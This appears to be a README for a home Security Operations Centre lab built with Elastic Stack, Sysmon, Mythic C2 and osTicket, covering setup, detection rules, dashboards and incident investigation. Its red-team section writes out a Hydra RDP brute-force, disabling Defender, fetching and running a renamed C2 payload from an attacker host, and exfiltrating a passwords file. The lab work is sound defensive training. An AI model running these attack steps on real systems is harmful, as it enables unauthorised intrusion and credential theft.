# 🛡️ Mini SOC Environment Project

> A hands-on, 29-day end-to-end **Security Operations Centre (SOC)** lab built from scratch using the **Elastic Stack (ELK)**, **Elastic Agent**, **Sysmon**, **Mythic C2**, and **osTicket**. This project documents every step — from provisioning infrastructure across seven virtual machines, to ingesting telemetry, building detections and dashboards, executing a full red-team attack chain, and investigating the resulting incidents end-to-end.

---

## 📋 Table of Contents

1. [Lab Overview](#-lab-overview)
2. [Architecture](#-architecture)
3. [Prerequisites](#-prerequisites)
4. [Phase 1 — Infrastructure Setup](#phase-1--infrastructure-setup)
5. [Phase 2 — Windows Server & RDP](#phase-2--windows-server--rdp)
6. [Phase 3 — Fleet Server & Agent Deployment](#phase-3--fleet-server--agent-deployment)
7. [Phase 4 — Sysmon & Data Ingestion](#phase-4--sysmon--data-ingestion)
8. [Phase 5 — Detection Engineering](#phase-5--detection-engineering)
9. [Phase 6 — Attack Simulation (Red Team)](#phase-6--attack-simulation-red-team)
10. [Phase 7 — Ticketing Integration (osTicket)](#phase-7--ticketing-integration-osticket)
11. [Phase 8 — Investigation & Threat Hunting](#phase-8--investigation--threat-hunting)
12. [Phase 9 — Elastic EDR](#phase-9--elastic-edr)
13. [Query Reference](#-query-reference)
14. [Lessons Learned](#-lessons-learned)

---

## 🔭 Lab Overview

This project simulates a real-world SOC environment where a **Blue Team** monitors and defends infrastructure while a **Red Team** compromises it. The goal was to build detection capabilities, create alerts and dashboards, automate incident routing through a ticketing system, and investigate incidents end-to-end — covering brute-force attacks, command-and-control (C2), and malware execution.

| Role       | Tooling                                          |
|------------|--------------------------------------------------|
| Blue Team  | Elastic Stack (ELK), Sysmon, Elastic EDR         |
| Red Team   | Kali Linux, Hydra, Mythic C2, Apollo agent       |
| Ticketing  | osTicket via Elastic Webhook                     |

**Objectives:**
- Ingest logs from Windows and Linux endpoints into the ELK stack
- Detect and investigate SSH/RDP brute-force activity and malware
- Build alerts and dashboards in Kibana
- Investigate command-and-control (C2) activity
- Integrate a ticketing system to route and manage alerts

---

## 🏗️ Architecture

The entire environment runs locally on a single Windows 10 desktop using **VirtualBox**, with all seven VMs placed on the same **NAT network** in the `172.31.0.x` range.

> 📷 *Add screenshot: logical network diagram of all 7 VMs*

**Machines used in this lab:**

| Instance          | OS                   | Role                                   | Key Port(s)     |
|-------------------|----------------------|----------------------------------------|-----------------|
| ELK-VM            | Ubuntu 25.04         | Elasticsearch + Kibana                 | 9200, 5601      |
| Fleet-Server      | Ubuntu 25.04         | Elastic Fleet / Agent management       | 8220            |
| Mythic-VM         | Ubuntu 25.04         | Mythic C2 framework (Red Team)         | 7443, 80, 9999  |
| Ubuntu-SSH        | Ubuntu 25.04         | Linux target / SSH brute-force target  | 22              |
| Windows-Server    | Windows Server 2022  | Target (victim) machine, RDP enabled   | 3389 (RDP)      |
| osTicket-Server   | Windows Server 2022  | osTicket helpdesk (XAMPP)              | 80, 443         |
| Kali Linux        | Kali                 | Attacker machine                       | —               |

---

## ✅ Prerequisites

- A virtualization platform (VirtualBox used here)
- Basic Linux CLI knowledge
- A local Kali Linux VM for the offensive side
- Awareness of key ports: SSH (22), Kibana (5601), Elasticsearch (9200), Fleet (8220), RDP (3389), Mythic (7443)

---

## Phase 1 — Infrastructure Setup

### 1.1 Provision the Virtual Machines *(Day 1)*

Seven VMs were created and joined to a single NAT network, with SSH enabled on the Ubuntu hosts so the desktop could administer them via PowerShell.

### 1.2 Elasticsearch, Logstash & Kibana — Concepts *(Day 2)*

- **Elasticsearch** — the datastore for logs; searchable via ES|QL and a RESTful JSON API (or through Kibana).
- **Logstash** — an ingestion pipeline that collects, transforms, filters, and outputs telemetry into Elasticsearch. Filtering (e.g. only forwarding a specific Windows Event ID such as `4624`) reduces ingestion cost; parsing maps keywords in a log to named fields.
- **Kibana** — the web console for querying Elasticsearch, with Kibana Lens for drag-and-drop dashboards, ES|QL data exploration, machine-learning anomaly detection, and geospatial mapping.

### 1.3 Elasticsearch Installation *(Day 3)*

Download and install the Elasticsearch `.deb` package on the ELK VM:

```bash
# Download the package (Ubuntu/Debian, x86_64)
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-<version>-amd64.deb

# Install — this prints the security auto-config output, including the
# generated superuser password. Save it immediately.
sudo dpkg -i elasticsearch-<version>-amd64.deb
```

If the `elastic` superuser password is lost, reset it:

```bash
cd /usr/share/elasticsearch/bin
sudo ./elasticsearch-reset-password -u elastic
```

Edit the config so the instance is reachable on the private network (bind address and port), then start and verify the service:

```bash
sudo nano /etc/elasticsearch/elasticsearch.yml   # set network.host and http.port

sudo systemctl start elasticsearch
sudo systemctl status elasticsearch
```

### 1.4 Kibana Deployment *(Day 4)*

Download and install Kibana on the ELK VM, then edit `kibana.yml` to uncomment `server.port` and `server.host`, set `server.host` to the ELK IP, and set `server.publicBaseUrl`:

```bash
sudo dpkg -i kibana-<version>-amd64.deb
sudo nano /etc/kibana/kibana.yml
```

Generate encryption keys for alerting and add them to the keystore:

```bash
cd /usr/share/kibana/bin
sudo ./kibana-encryption-keys generate                 # produces 3 keys
sudo ./kibana-keystore add <key-name>                  # repeat for each key
```

Start Kibana, add a VirtualBox port-forwarding rule for `5601`, then enroll Kibana with Elasticsearch:

```bash
cd /usr/share/elasticsearch/bin
sudo ./elasticsearch-create-enrollment-token --scope kibana

cd /usr/share/kibana/bin
sudo ./kibana-verification-code
```

> 📷 *Add screenshot: Kibana login / first dashboard*

---

## Phase 2 — Windows Server & RDP

*(Day 5)* — A Windows Server 2022 VM was provisioned as the victim host, with **Remote Desktop enabled** (`Remote Desktop settings > Enable Remote Desktop`) to serve as the RDP brute-force target later in the attack chain.

---

## Phase 3 — Fleet Server & Agent Deployment

### 3.1 Fleet & Elastic Agent — Concepts *(Day 6)*

The **Elastic Agent** provides a unified way to collect logs, metrics, and other data, driven by policies that can be updated centrally. A **Fleet Server** connects agents to Fleet so many endpoints can be managed from one place — simplifying policy updates, integration changes, version upgrades, and un-enrollment.

### 3.2 Fleet Server & Windows Agent *(Day 7)*

The Fleet Server was added via the Kibana Fleet UI, its port changed from the default `443` to `8220`, and the agent installed to the Fleet VM:

```bash
# On the Fleet VM — install the Elastic Agent as the Fleet Server
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-<version>-linux-x86_64.tar.gz
tar xzvf elastic-agent-<version>-linux-x86_64.tar.gz
cd elastic-agent-<version>-linux-x86_64
sudo ./elastic-agent install --fleet-server-es=<es-url> --insecure
```

A Windows agent policy was created, and the agent installed on the Windows Server with `--insecure` to permit the self-signed certificate:

```powershell
.\elastic-agent.exe install --insecure
```

> ⚠️ The `--insecure` flag and self-signed certs are used **only** because this is a lab. In production, use a proper certificate authority.

### 3.3 Linux (SSH) Agent *(Days 12–13)*

The Ubuntu SSH server was updated and its auth logs reviewed before enrolling it:

```bash
sudo apt-get update && sudo apt-get upgrade -y

# Authentication logs live here
cd /var/log
cat auth.log

# Filter for failed root logins, then extract just the source IP (9th field)
grep -i failed auth.log | grep -i root
grep -i failed auth.log | grep -i root | cut -d ' ' -f 9
```

A dedicated **Linux** agent policy was created and the agent enrolled:

```bash
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-<version>-linux-x86_64.tar.gz
tar xzvf elastic-agent-<version>-linux-x86_64.tar.gz
cd elastic-agent-<version>-linux-x86_64
sudo ./elastic-agent install --url=https://<fleet-ip>:8220 --enrollment-token=<token> --insecure
```

With the Fleet, Windows, and Ubuntu agents all reporting, log delivery was confirmed by filtering on an agent name and searching for `authentication failure`.

---

## Phase 4 — Sysmon & Data Ingestion

### 4.1 Why Sysmon *(Day 8)*

Default Windows logging doesn't capture critical detail such as process creations. **Sysmon** (part of Sysinternals) adds rich telemetry — process creations (Event ID 1), network connections (Event ID 3), file creations (Event ID 11), image loads (Event ID 7, disabled by default), and more. The **Process GUID** field is invaluable for correlating events across a single process's lifetime, and captured hashes enable OSINT enrichment (e.g. VirusTotal). Network-connection logging must be enabled via the config.

### 4.2 Sysmon Installation *(Day 9)*

Sysmon (v15.15) was installed with the community **olafhartong** config:

```powershell
# From the Sysmon directory, as Administrator
.\Sysmon64.exe -i sysmonconfig.xml
```

Installation was verified in **Services**, and log generation confirmed in **Event Viewer** under `Microsoft-Windows-Sysmon/Operational`.

### 4.3 Ingesting Sysmon & Defender Logs *(Day 10)*

Using **Integrations > Custom Windows Event Logs** in Kibana, two channels were added:

- `Microsoft-Windows-Sysmon/Operational`
- Windows Defender (limited to Event IDs `1116`, `1117`, `5001` to cut noise)

Disabling real-time protection on the Windows host generated Defender **Event ID 5001**, confirming the pipeline. Ingestion was validated with:

```text
winlog.event_id: 1        # confirms event.provider = Microsoft-Windows-Sysmon
winlog.event_id: 5001     # "real-time protection disabled" event
```

> 📷 *Add screenshot: Sysmon + Defender logs landing in Elasticsearch*

---

## Phase 5 — Detection Engineering

### 5.1 Brute-Force Background *(Day 11)*

Notes on the three common brute-force styles (simple, dictionary, credential stuffing), defensive controls (long passphrases, MFA, vigilance), and common tooling (Hydra, Hashcat, John the Ripper).

### 5.2 SSH Brute-Force Alert & Dashboard *(Day 14)*

Interested in **failed attempts, user, and source IP**, the base query and columns were:

```text
system.auth.ssh.event: *
# columns: system.auth.ssh.event, user.name, source.ip
```

Since all VMs use non-routable local IPs, GeoIP fields (`source.geo.country_name`) return null — so the map layers are demonstrated but empty. In a public-facing setup, a **Choropleth** map layer joined on world countries would visualize attack origins. Maps were saved to a dashboard, and a duplicate created for *Accepted* logins alongside *Failed*.

### 5.3 RDP Detection & Windows Auth *(Days 15–16)*

Background on RDP abuse (initial access, lateral movement) and exposure discovery via **Shodan** (`port:3389`) and **Censys**. Windows authentication detections were built around:

```text
event.code: 4625     # failed logon
event.code: 4624     # successful logon (see LogonType for RDP: 7, 10)
```

A **threshold** detection rule was created in **Security > Rules**, grouping by `user.name` and `source.ip`, with severity, references, false-positive notes, MITRE ATT&CK mapping, a custom highlighted `source.ip` field, and an investigation guide. Rules for both SSH and RDP were validated by manually simulating brute-force attempts.

### 5.4 Authentication Dashboards *(Day 17)*

A consolidated dashboard was built showing **SSH Failed / SSH Accepted / RDP Failed / RDP Successful** authentications. Successful RDP was captured with:

```text
event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)
```

Tables of `user.name`, count, and `source.ip` were placed beside the maps for readability.

> 📷 *Add screenshot: consolidated SSH/RDP authentication dashboard*

---

## Phase 6 — Attack Simulation (Red Team)

### 6.1 C2 Concepts & Mythic *(Days 18–20)*

Background on what malware does post-execution (discovery, persistence, and establishing **command-and-control**), the MITRE ATT&CK C2 tactic, and common frameworks (Metasploit, Cobalt Strike, Sliver, Mythic). Mythic — built on Go, Docker, and a web UI — was chosen.

```bash
# On the Mythic VM
sudo apt install docker-compose
sudo apt install make
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo make
sudo ./mythic-cli start
cat .env                # retrieve the generated admin credentials

# Install the Apollo agent
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

> 📷 *Add screenshot: attack diagram (Day 19) mapping the 6-phase plan*

### 6.2 Full Attack Chain *(Day 21)*

A six-phase attack was executed end-to-end against the Windows Server:

**Phase 1 — Initial Access (RDP brute force).** A 50-entry wordlist (with the known password appended) was used with Hydra:

```bash
hydra -l Administrator -P mydfir-wordlist.txt rdp://172.31.0.4/32
# then log in with the recovered credential
xfreerdp /u:Administrator /p:<password> /v:172.31.0.4:3389
```

**Phase 2 — Discovery.**

```cmd
whoami
ipconfig
net user
net group
net user administrator
```

**Phase 3 — Defense Evasion.** Windows Security > Virus & threat protection settings disabled.

**Phase 4 — Execution.** An HTTP C2 profile was added, a Windows payload generated in Mythic, downloaded to the C2 host, renamed `svchost-mydfir.exe`, and served over a temporary Python server:

```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
wget https://172.31.0.6:7443/direct/download/<payload-id> --no-check-certificate
python3 -m http.server 9999
```

The victim then pulled and executed the payload:

```powershell
Invoke-WebRequest -Uri http://172.31.0.11:9999/svchost-mydfir.exe -OutFile "C:\Users\Administrator\Downloads\svchost-mydfir.exe"
.\svchost-mydfir.exe
netstat -anob        # confirm the outbound connection + owning PID
```

**Phase 5 — Command & Control.** The callback appeared in Mythic; `whoami` / `ifconfig` confirmed a live session.

**Phase 6 — Exfiltration.** The staged `passwords.txt` was pulled back through the C2 channel:

```text
download C:\Users\Administrator\Documents\passwords.txt
```

### 6.3 C2 Detection Alert & Dashboards *(Day 22)*

The payload's file-create event (`event.code: 11`) was pivoted via **Process GUID** to the process-create event (`event.code: 1`) to recover hashes and the tell-tale `OriginalFileName: Apollo.exe`. A robust detection rule was written that survives a renamed binary:

```text
event.code: 1 and (winlog.event_data.Hashes: *<SHA256>* or winlog.event_data.OriginalFileName: Apollo.exe)
```

A **Suspicious Activity** dashboard was built across three panels:

```text
# Process creation of common LOLBins
event.code: 1 and event.provider: Microsoft-Windows-Sysmon and (powershell or cmd or rundll32)

# Outbound network connections (excluding Defender noise)
event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true
and not (winlog.event_data.Image: *MsMpEng.exe or winlog.event_data.Image: *MpDefenderCoreService.exe)

# Defender disabled
event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender
```

> 📷 *Add screenshot: Suspicious Activity dashboard (3 panels)*

---

## Phase 7 — Ticketing Integration (osTicket)

*(Days 23–25)* — **osTicket** was deployed on a Windows Server via **XAMPP** (Apache + MySQL), configured against the VM's IP, and installed under `htdocs/osticket`. An **API key** was generated with *Can create Tickets* enabled, then wired into Elastic via **Stack Management > Connectors > Webhook**:

- URL: osTicket server IP + `/osticket/upload/tickets.xml`
- Authentication: none; API key passed as an HTTP header
- Inbound firewall rules opened for ports 80 and 443

A connector test produced a ticket in osTicket, confirming the integration. At this milestone the lab had a full pipeline: ELK + two victim servers + agents + brute-force/C2 detections + a self-hosted ticketing system.

---

## Phase 8 — Investigation & Threat Hunting

### 8.1 SSH Brute-Force Investigation *(Day 26)*

Using Elastic **Timelines**, alerts were triaged against four questions: *Is the IP known-abusive? Are other users affected? Were any successful? What happened after a successful login?* Enrichment tools referenced: **AbuseIPDB** and **GreyNoise**. Detection rules were then wired to push alerts into osTicket (Actions > Webhook, *For each alert*), passing context into the ticket body:

```text
{{context.alerts.0.source.ip}}, {{context.alerts.0.user.name}}
{{rule.name}}
{{rule.url}}
```

### 8.2 RDP Brute-Force Investigation *(Day 27)*

The same four-question methodology was applied to RDP. Logs were normalized to UTC (`Stack Management > Kibana > Advanced settings > Time zone`), and `TargetLogonId` sessions were reviewed by duration to isolate the suspicious one:

> **Identified window:** Sept 14 @ 18:53:09 → 19:36:06 UTC (~42 min, 46 events)

### 8.3 Mythic C2 Investigation *(Day 28)*

Working from the **Suspicious Activity** dashboards, an odd `svchost-mydfir.exe` in `Downloads` initiating an outbound connection was pivoted via its **Process GUID** to reconstruct the timeline:

```text
- 18:53:09  Potential start
- 18:58:08  Network connection to 172.31.0.11
- 19:09:50  File created: svchost-mydfir.exe (Downloads)  [event.code: 11]
- 19:09:51  File executable detected                      [event.code: 29]
- 19:36:06  Potential end
```

A key takeaway: commands issued **inside** an existing C2 session (e.g. `netstat`) appear only in **network** telemetry (and encrypted), whereas actions that spawn new processes (`shell ipconfig` → `cmd.exe`) surface in **endpoint** telemetry — underscoring the need to monitor both.

> 📷 *Add screenshot: reconstructed C2 attack timeline*

---

## Phase 9 — Elastic EDR

*(Day 29)* — **Elastic Defend** was deployed (Complete EDR, Traditional Endpoints) to the Windows Server via the Fleet policy. Re-running the malicious payload triggered automatic quarantine and a **malware** alert. A **response action** was configured to isolate the host on detection:

```text
# Verify quarantine/detection
"malware"
```

To prove isolation, a continuous `ping 8.8.8.8` was started on the victim; the moment the payload was re-downloaded, Elastic deleted the file **and isolated the host from the network** — the ping loop dropped, confirming automated containment.

> 📷 *Add screenshot: host auto-isolated by Elastic EDR*

---

## 🔎 Query Reference

| Purpose | Query |
|---------|-------|
| SSH auth events | `system.auth.ssh.event: *` |
| SSH failed (specific host) | `system.auth.ssh.event: * and agent.name: ubuntu-vm and system.auth.ssh.event: Failed` |
| Windows failed logon | `event.code: 4625` |
| Windows successful RDP | `event.code: 4624 and (winlog.event_data.LogonType: 10 or winlog.event_data.LogonType: 7)` |
| Sysmon ingestion check | `winlog.event_id: 1` |
| Defender disabled | `event.code: 5001 and event.provider: Microsoft-Windows-Windows Defender` |
| C2 payload (resilient) | `event.code: 1 and (winlog.event_data.Hashes: *<SHA256>* or winlog.event_data.OriginalFileName: Apollo.exe)` |
| Outbound connections (filtered) | `event.code: 3 and event.provider: Microsoft-Windows-Sysmon and winlog.event_data.Initiated: true and not (winlog.event_data.Image: *MsMpEng.exe or winlog.event_data.Image: *MpDefenderCoreService.exe)` |

---

## 🎓 Lessons Learned

- **Visibility is everything.** Default Windows logging is insufficient; Sysmon + a good config dramatically increases the chance of catching malicious activity.
- **Process GUID is the backbone of correlation.** Nearly every investigation in this lab hinged on pivoting through the Process GUID to reconstruct a full process lineage.
- **Endpoint *and* network telemetry are both required.** C2 commands that don't spawn a process (e.g. `netstat`) are invisible to endpoint logs — network monitoring would have closed that gap.
- **Detections should survive evasion.** Alerting on `OriginalFileName` and hashes (not just the on-disk filename) defeats a trivial rename.
- **Lab constraints matter.** Local, non-routable IPs mean no GeoIP data — worth documenting so map panels aren't mistaken for broken.
- **Ticketing closes the loop.** Routing alerts into osTicket with source IP, user, and a rule link turns raw detections into an actionable, auditable workflow.

---

### 🧰 Tools Used

`Elastic Stack (ELK)` · `Elastic Agent / Fleet` · `Sysmon` · `Kibana` · `Elastic EDR` · `Mythic C2` · `Apollo` · `Kali Linux` · `Hydra` · `osTicket` · `VirtualBox`
